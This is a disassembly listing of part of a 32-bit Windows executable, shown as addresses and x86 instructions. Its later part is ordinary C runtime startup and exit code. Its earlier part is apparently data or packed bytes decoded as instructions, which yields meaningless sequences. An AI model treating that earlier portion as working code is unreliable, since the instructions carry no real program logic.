  422485:	repnz or BYTE PTR [edx-0x862ed8f],0xe0
  42248d:	inc    ebp
  42248e:	gs mov al,0x0
  422491:	gs mov bl,0x76
  422494:	aas    
  422495:	mov    bl,0x1b
  422497:	cmp    edi,DWORD PTR [eax]
  422499:	lahf   
  42249a:	ss test al,0xd4
  42249d:	inc    esp
  42249e:	int    0xeb
  4224a0:	pop    es
  4224a1:	cdq    
  4224a2:	dec    ebx
  4224a3:	sub    DWORD PTR [ebx],ebx
  4224a5:	mov    ds:0x99212e2e,al
  4224aa:	mov    BYTE PTR [eax-0x68],ah
  4224ad:	xor    eax,0x477c8319
  4224b2:	and    ch,al
  4224b4:	loopne 0x4224c2
  4224b6:	or     eax,0x194882b4
  4224bb:	clc    
  4224bc:	xchg   DWORD PTR [esi+0x79],ecx
  4224bf:	or     al,0x1d
  4224c1:	out    0xca,eax
  4224c3:	bound  esi,QWORD PTR [esi+edi*2+0x4d44d946]
  4224ca:	stc    
  4224cb:	int    0x1e
  4224cd:	pop    edx
  4224ce:	dec    ebx
  4224cf:	dec    esi
  4224d0:	sti    
  4224d1:	inc    edi
  4224d2:	out    0xe,eax
  4224d4:	sub    edi,eax
  4224d6:	mov    dh,0xf2
  4224d8:	int    0xcf
  4224da:	rcr    BYTE PTR [esi],0x9d
  4224dd:	adc    eax,0xe4cdbb48
  4224e2:	push   ds
  4224e3:	jne    0x422483
  4224e5:	xor    DWORD PTR [eax+0x29],esp
  4224e8:	sbb    edi,esi
  4224ea:	not    DWORD PTR [ebx+0x696b0598]
  4224f0:	or     ecx,0xaab89b9f
  4224f6:	jno    0x422559
  4224f8:	mov    dl,0x74
  4224fa:	sti    
  4224fb:	ins    BYTE PTR es:[edi],dx
  4224fc:	push   ebp
  4224fd:	cmp    edx,edi
  4224ff:	and    DWORD PTR [ecx-0x41],eax
  422502:	pop    eax
  422503:	retf   0x49ec
  422506:	sahf   
  422507:	ret    0xb35e
  42250a:	fmul   DWORD PTR [ebx]
  42250c:	retf   
  42250d:	lods   al,BYTE PTR ds:[esi]
  42250e:	inc    BYTE PTR [ebx+0x17ae26de]
  422514:	rol    DWORD PTR [ecx-0x18],1
  422517:	(bad)  
  422518:	bound  esi,QWORD PTR [edi-0x36]
  42251b:	add    ch,BYTE PTR [esi+0x1f]
  42251e:	mov    cl,0xdb
  422520:	dec    edi
  422521:	push   edx
  422522:	mov    ah,0x13
  422524:	sub    BYTE PTR [ebp-0x7c019e59],ah
  42252a:	call   0x76ef7d06
  42252f:	sub    BYTE PTR [esi-0x27],al
  422532:	xor    BYTE PTR [eax+0x4c],dl
  422535:	push   ss
  422536:	and    eax,0xe2ca5f56
  42253b:	pop    ebx
  42253d:	into   
  42253e:	scas   al,BYTE PTR es:[edi]
  42253f:	push   ss
  422540:	ss data16 std 
  422543:	out    0x2c,eax
  422545:	xchg   ebp,eax
  422546:	xor    al,0x9b
  422548:	mov    ch,0x5f
  42254b:	add    eax,0xfb9d215d
  422550:	push   cs
  422551:	jmp    0x8121:0x999df5eb
  422558:	xor    al,0x7f
  42255a:	pop    esi
  42255b:	repz xchg esi,eax
  42255d:	ds nop
  42255f:	jbe    0x4225a5
  422561:	pop    es
  422562:	inc    edx
  422563:	dec    ecx
  422564:	leave  
  422565:	and    DWORD PTR [eax-0x2c],edi
  422568:	inc    eax
  422569:	int3   
  42256a:	adc    ah,BYTE PTR [eax]
  42256c:	cmp    ch,al
  42256e:	sub    eax,0xe7a6d727
  422573:	fsub   QWORD PTR [ebp*2+0x5035a289]
  42257a:	push   esp
  42257b:	(bad)  [edi]
  42257d:	push   es
  42257e:	xchg   esp,eax
  42257f:	test   eax,0x6a07502c
  422584:	push   eax
  422585:	add    DWORD PTR [eax+0x4f],ebx
  422588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422589:	mov    ds:0xebb6e429,al
  42258e:	scas   al,BYTE PTR es:[edi]
  42258f:	call   0x9ac217c7
  422594:	mov    edx,0xf041b28d
  422599:	(bad)  
  42259a:	fwait
  42259b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42259c:	bswap  eax
  42259e:	push   eax
  42259f:	and    eax,DWORD PTR [ebp+0x7a]
  4225a2:	push   edx
  4225a3:	mov    al,0x7a
  4225a5:	imul   ebx,esi,0xffffffc1
  4225a8:	adc    DWORD PTR [ecx-0x74],esi
  4225ab:	fcom   QWORD PTR [ecx+ebx*8]
  4225ae:	dec    ebx
  4225af:	sti    
  4225b0:	call   0xb7b37a3a
  4225b5:	dec    esp
  4225b6:	test   al,0x9d
  4225b8:	fisubr DWORD PTR [eax]
  4225ba:	ror    BYTE PTR [esi+0x5e],cl
  4225bd:	jns    0x4225c7
  4225bf:	xor    edi,esi
  4225c1:	or     BYTE PTR [edx-0x7d2c814],dl
  4225c7:	ficom  DWORD PTR [eax-0x1e53cd33]
  4225cd:	sti    
  4225ce:	mov    ch,0x2a
  4225d0:	in     al,0xae
  4225d2:	adc    eax,0xc3c6c97e
  4225d7:	lock dec ecx
  4225d9:	call   0xad5d:0xcf8cc4df
  4225e0:	mov    BYTE PTR [ebx-0x48314a5d],dl
  4225e6:	mov    ebx,0x128eec2
  4225eb:	arpl   WORD PTR [esi+0x1],bp
  4225ee:	cmc    
  4225ef:	dec    ebp
  4225f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f1:	mov    esi,0x316ad56e
  4225f6:	inc    ecx
  4225f7:	retf   0x7e65
  4225fa:	push   edi
  4225fb:	ret    
  4225fc:	or     BYTE PTR [edi+0x1],0xbc
  422600:	stc    
  422601:	(bad)  
  422603:	test   ebp,esp
  422605:	pop    es
  422606:	mov    ecx,DWORD PTR [ebx-0x299c0a0a]
  42260c:	loopne 0x422642
  42260e:	push   es
  42260f:	mov    ds:0x4c8fb139,al
  422614:	mov    ebp,0x3f2d411a
  422619:	cmp    eax,0xae87030
  42261e:	pop    edi
  42261f:	stos   DWORD PTR es:[edi],eax
  422620:	std    
  422621:	jecxz  0x42268f
  422623:	jno    0x422683
  422625:	mov    al,0xa7
  422627:	mov    ah,0xda
  422629:	pop    edi
  42262a:	fisub  WORD PTR [ecx+esi*1-0x3996d616]
  422631:	pop    ecx
  422632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422633:	es mov ah,0x8f
  422636:	xchg   esi,eax
  422637:	push   es
  422638:	(bad)  
  422639:	fcom   QWORD PTR [ecx]
  42263b:	push   ss
  42263c:	cmp    al,0x60
  42263e:	cmp    al,0x34
  422640:	adc    ebp,DWORD PTR [edi]
  422642:	lods   al,BYTE PTR ds:[esi]
  422643:	push   eax
  422644:	mov    esp,0x26d7af05
  422649:	scas   al,BYTE PTR es:[edi]
  42264a:	jae    0x422642
  42264c:	adc    eax,edi
  42264e:	mov    WORD PTR [ebx+ebx*8-0x27553a3a],ds
  422655:	rcr    DWORD PTR [ecx],0x5a
  422658:	xor    edi,DWORD PTR [eax-0x1d]
  42265b:	ss sub ebp,ebx
  42265e:	jno    0x42269d
  422660:	shr    DWORD PTR ds:0xad7ff4b7,0xf8
  422667:	mov    ebp,0x1ff6cafa
  42266c:	sub    al,0xdd
  42266e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266f:	pop    es
  422670:	outs   dx,DWORD PTR ds:[esi]
  422671:	mov    esp,0xa4b5f3c2
  422676:	jg     0x4226b4
  422678:	cwde   
  422679:	mov    ecx,0x22c94741
  42267e:	jl     0x4226ba
  422680:	outs   dx,BYTE PTR ds:[esi]
  422681:	sar    DWORD PTR [ebx],1
  422683:	ret    0xc602
  422686:	fidivr WORD PTR [ecx-0x70]
  422689:	push   ecx
  42268a:	(bad)  
  42268b:	xchg   ecx,eax
  42268c:	test   BYTE PTR [ecx+ecx*8],ch
  42268f:	or     ch,BYTE PTR [esi+0x58]
  422692:	gs call 0xf98d:0x5c83663a
  42269a:	call   0xdc40:0xa18c6053
  4226a1:	pop    ebp
  4226a2:	jmp    0xb47f:0xe3a09a17
  4226a9:	xor    BYTE PTR [edi+0xda7f99b],cl
  4226af:	aad    0x19
  4226b1:	mov    edi,0x790cfa90
  4226b6:	jl     0x422666
  4226b8:	xor    dl,BYTE PTR [eax+edx*8+0x3e]
  4226bc:	xchg   BYTE PTR [edi+0x19],ah
  4226bf:	pop    ebp
  4226c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c1:	jl     0x4226df
  4226c3:	xchg   esi,eax
  4226c4:	dec    eax
  4226c5:	clc    
  4226c6:	push   ebp
  4226c7:	mov    ch,0x8
  4226c9:	push   ss
  4226ca:	cs add eax,esi
  4226cd:	xor    DWORD PTR [edi],ebx
  4226cf:	push   cs
  4226d0:	call   0x5577783
  4226d5:	adc    eax,0xa7d8cacb
  4226da:	mov    WORD PTR [ebp+0x44],?
  4226dd:	daa    
  4226de:	cld    
  4226df:	pop    eax
  4226e0:	(bad)  
  4226e1:	je     0x4226d2
  4226e3:	mov    al,0x72
  4226e5:	mov    cl,ch
  4226e7:	daa    
  4226e8:	jo     0x4226db
  4226ea:	shl    BYTE PTR [ebx+0x5e952c92],cl
  4226f0:	sub    BYTE PTR [ecx-0x257aa3bb],0x7a
  4226f7:	leave  
  4226f8:	out    dx,al
  4226f9:	mov    BYTE PTR [ecx],bh
  4226fb:	sub    esp,DWORD PTR [eax-0x63]
  4226fe:	cs popa 
  422700:	imul   eax,DWORD PTR [edx-0x3488fbb1],0xb1e343fa
  42270a:	inc    edi
  42270b:	dec    eax
  42270c:	in     eax,dx
  42270d:	sub    ecx,esi
  42270f:	leave  
  422710:	jno    0x42271d
  422712:	cmp    DWORD PTR [esi],esi
  422714:	fld    DWORD PTR [edi-0x6f8dae9a]
  42271a:	pop    edx
  42271b:	jecxz  0x422714
  42271d:	cwde   
  42271e:	jns    0x422753
  422720:	xor    DWORD PTR [edi],esp
  422722:	add    al,0xea
  422724:	retf   0x24ac
  422727:	jmp    0x422735
  422729:	mov    al,BYTE PTR [ebx-0x6a]
  42272c:	(bad)  
  42272d:	ret    0x9029
  422730:	out    dx,al
  422731:	into   
  422732:	in     eax,0xb0
  422734:	cld    
  422735:	adc    BYTE PTR [ebx-0x44],0xaa
  422739:	mov    al,0x9b
  42273b:	loope  0x4227b6
  42273d:	or     al,0x4a
  42273f:	in     al,0xfe
  422741:	pop    esi
  422742:	sub    DWORD PTR [ecx],esi
  422744:	cdq    
  422745:	gs imul ebx,eax,0xc8bcb107
  42274c:	repz or eax,0x555d6019
  422752:	ret    
  422753:	add    ch,BYTE PTR ds:0x17a29fb9
  422759:	lea    edx,[eax+0xed7e827]
  42275f:	sub    eax,0x6278d8ed
  422764:	mov    cl,0x2e
  422766:	xor    BYTE PTR es:[ecx],bl
  422769:	and    esi,edx
  42276b:	retf   0x6a7e
  42276e:	shld   ebx,edi,0x34
  422772:	ds std 
  422774:	jo     0x42271d
  422776:	popa   
  422777:	addr16 mov ch,0xc9
  42277a:	jmp    0x7f295dbc
  42277f:	inc    edi
  422780:	push   0xd2ca7c6
  422785:	scas   al,BYTE PTR es:[edi]
  422786:	les    esp,FWORD PTR ds:0x7efbdbad
  42278c:	sub    al,0xae
  42278e:	cmp    bl,BYTE PTR ds:0x89081707
  422794:	outs   dx,DWORD PTR ds:[esi]
  422795:	hlt    
  422796:	mov    cl,0xc2
  422798:	xchg   ebp,eax
  422799:	inc    ecx
  42279a:	pop    edx
  42279b:	sub    cl,BYTE PTR [eax]
  42279d:	ds out dx,al
  42279f:	pop    esp
  4227a0:	add    ebp,DWORD PTR [ecx-0x14647cef]
  4227a6:	xchg   esi,eax
  4227a7:	adc    al,0xaf
  4227a9:	xor    esp,DWORD PTR [esi]
  4227ab:	daa    
  4227ac:	adc    DWORD PTR [edi-0x41],ebx
  4227af:	je     0x4227a4
  4227b1:	adc    DWORD PTR [edi+edi*2+0x1538cf2d],edi
  4227b8:	and    bl,BYTE PTR ds:0xe16306d
  4227be:	fisttp QWORD PTR [ecx-0x48]
  4227c1:	dec    eax
  4227c2:	loopne 0x422767
  4227c4:	inc    ebp
  4227c5:	inc    ecx
  4227c6:	js     0x42278e
  4227c8:	aad    0x51
  4227ca:	mov    ebp,0xa1f59f1b
  4227cf:	adc    DWORD PTR ds:0x8c0d9e7e,ebx
  4227d5:	(bad)  
  4227d6:	sbb    dh,BYTE PTR [edi+0x7f46b58a]
  4227dc:	or     DWORD PTR [edi],edx
  4227de:	stos   DWORD PTR es:[edi],eax
  4227df:	int    0x73
  4227e1:	lds    edx,FWORD PTR [ebp+0xc282acc]
  4227e7:	dec    edx
  4227e8:	or     BYTE PTR [eax],bh
  4227ea:	out    dx,eax
  4227eb:	icebp  
  4227ec:	lods   al,BYTE PTR ds:[esi]
  4227ed:	mov    cl,0x7e
  4227ef:	shr    BYTE PTR [edi],cl
  4227f1:	(bad)  
  4227f2:	fcomp  QWORD PTR [edi]
  4227f4:	out    0x2c,al
  4227f6:	dec    ecx
  4227f7:	imul   ecx,DWORD PTR [esi],0x39
  4227fa:	imul   BYTE PTR [ecx-0x649145b5]
  422800:	xor    eax,0x2fbd2db0
  422805:	ja     0x4227d9
  422807:	add    al,0x94
  422809:	pop    edx
  42280a:	into   
  42280b:	cs push ecx
  42280d:	repz pushf 
  42280f:	mov    ebp,0x2fba797
  422814:	in     eax,dx
  422815:	inc    esi
  422816:	sub    eax,0x20a37f2c
  42281b:	mov    bh,0xb6
  42281d:	mov    eax,0x58acaae
  422822:	ret    
  422823:	stc    
  422824:	call   0x92b8:0xbce09c74
  42282b:	test   eax,0x54c3c609
  422830:	popf   
  422831:	mov    ebp,0x178be6dc
  422836:	lods   eax,DWORD PTR ds:[esi]
  422838:	shl    DWORD PTR [eax],1
  42283a:	dec    esi
  42283b:	in     eax,dx
  42283c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42283d:	popa   
  42283e:	pop    ds
  42283f:	sahf   
  422840:	xchg   BYTE PTR [edi+eiz*8],al
  422843:	fisttp QWORD PTR [edi+0x3ff9c372]
  422849:	pop    es
  42284a:	xor    cl,BYTE PTR [ebp+0x1467da7e]
  422850:	outs   dx,BYTE PTR ds:[esi]
  422851:	cmp    DWORD PTR [eax+0x36d97564],esp
  422857:	fmul   st,st(3)
  422859:	test   al,0x8b
  42285b:	or     eax,0x50a4f9fb
  422860:	pop    esp
  422861:	xchg   ecx,eax
  422862:	out    dx,al
  422863:	or     DWORD PTR [ebx+0x1e],0x7625b452
  42286a:	xchg   eax,ecx
  42286c:	pop    edi
  42286d:	cmp    BYTE PTR [eax+0x6cb8c34],ah
  422873:	inc    esp
  422874:	loopne 0x42288a
  422876:	(bad)  [edi-0x9738879]
  42287c:	(bad)  
  42287d:	ds retf 
  42287f:	and    eax,0x35dd4843
  422884:	mov    WORD PTR [edx+0x497700d6],ds
  42288a:	aam    0x24
  42288c:	(bad)  
  42288e:	(bad)  
  422890:	retf   
  422891:	xchg   edi,esi
  422893:	or     ah,al
  422895:	repnz popf 
  422897:	mov    dh,0x46
  422899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42289a:	inc    eax
  42289b:	pop    edx
  42289c:	sti    
  42289d:	retf   0x8860
  4228a0:	enter  0x3c84,0x51
  4228a4:	imul   edx,DWORD PTR [ebp+ebp*4-0x57d12b04],0x2d27817d
  4228af:	xor    al,0xdd
  4228b1:	js     0x4228ab
  4228b3:	mov    esi,0xe5aacea3
  4228b8:	out    0x23,al
  4228ba:	add    DWORD PTR [ebx],edi
  4228bc:	call   0x83ebb44f
  4228c1:	push   ss
  4228c2:	inc    esp
  4228c3:	std    
  4228c4:	les    esi,FWORD PTR [ebp+0x1c54c5a3]
  4228ca:	jle    0x422928
  4228cc:	jo     0x4228ea
  4228ce:	(bad)  
  4228cf:	xlat   BYTE PTR ds:[ebx]
  4228d0:	mov    eax,0x402d35bc
  4228d5:	inc    ebp
  4228d6:	pop    edi
  4228d7:	not    BYTE PTR [ebp-0x6b2ae5f4]
  4228dd:	fldpi  
  4228df:	mov    ds:0x9f913e51,al
  4228e4:	pop    ss
  4228e5:	inc    BYTE PTR [edx]
  4228e7:	mov    al,ch
  4228e9:	dec    esp
  4228ea:	pop    ebp
  4228ec:	inc    edi
  4228ed:	adc    bl,BYTE PTR [edx-0xc737336]
  4228f3:	pop    gs
  4228f5:	in     al,0x69
  4228f7:	fwait
  4228f8:	cwde   
  4228f9:	jg     0x422932
  4228fb:	mov    cl,0xd3
  4228fd:	pop    esp
  4228fe:	adc    al,0xf3
  422900:	xchg   esp,eax
  422901:	inc    BYTE PTR [eax-0x21210304]
  422907:	jle    0x42297e
  422909:	add    BYTE PTR [edi+0x42],0x30
  42290d:	adc    BYTE PTR [ecx+0x57],al
  422910:	stc    
  422911:	pushf  
  422912:	push   ebp
  422913:	dec    edi
  422914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422915:	xor    eax,eax
  422917:	mov    esp,ebp
  422919:	pop    ebp
  42291a:	ret    0x10
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
